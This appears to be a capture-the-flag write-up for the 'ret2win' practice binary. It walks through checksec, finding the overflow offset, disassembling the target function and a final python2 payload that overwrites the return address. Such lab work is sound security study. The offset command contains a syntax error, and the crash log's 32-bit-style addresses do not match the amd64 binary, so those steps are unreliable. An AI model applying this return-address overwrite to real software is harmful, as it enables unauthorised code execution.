# Basic Test:

## Check call system into binary file
```bash
strace ./ret2win
```

## Check protection into binary file
```bash
checksec ./ret2win
```

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

<br>

# Exploitation:

## Clear the kernel ring buffer
```bash
sudo dmesg -C
```

## Find offset for overwrite RIP
```bash
python2 -c 'print "A"*40 + "B"*4*' | ./ret2win
```

## See output
```bash
sudo dmesg -T
```

	[sam. avril  8 13:18:56 2023] ret2win[31929]: segfault at a42424242 ip 0000000042424242 sp 00000000ffed7d00 error 14 in libc.so.6[f7c00000+22000] likely on CPU 0 (core 0, socket 0)

## Find the return address to print the flag

```bash
pwngdb> disass*ret2win
```
 
	   0x0000000000400756 <+0>:     push   rbp
	   0x0000000000400757 <+1>:     mov    rbp,rsp
	   0x000000000040075a <+4>:     mov    edi,0x400926
	   0x000000000040075f <+9>:     call   0x400550 <puts@plt>
	   0x0000000000400764 <+14>:    mov    edi,0x400943
	   0x0000000000400769 <+19>:    call   0x400560 <system@plt>
	   0x000000000040076e <+24>:    nop
	   0x000000000040076f <+25>:    pop    rbp
	   0x0000000000400770 <+26>:    ret

## Payload final CLI

```bash
python2 -c 'print "A"*40 + "\x57\x07\x40\x00\x00\x00\x00\x00"' | ./ret2win #0x0000000000400757
```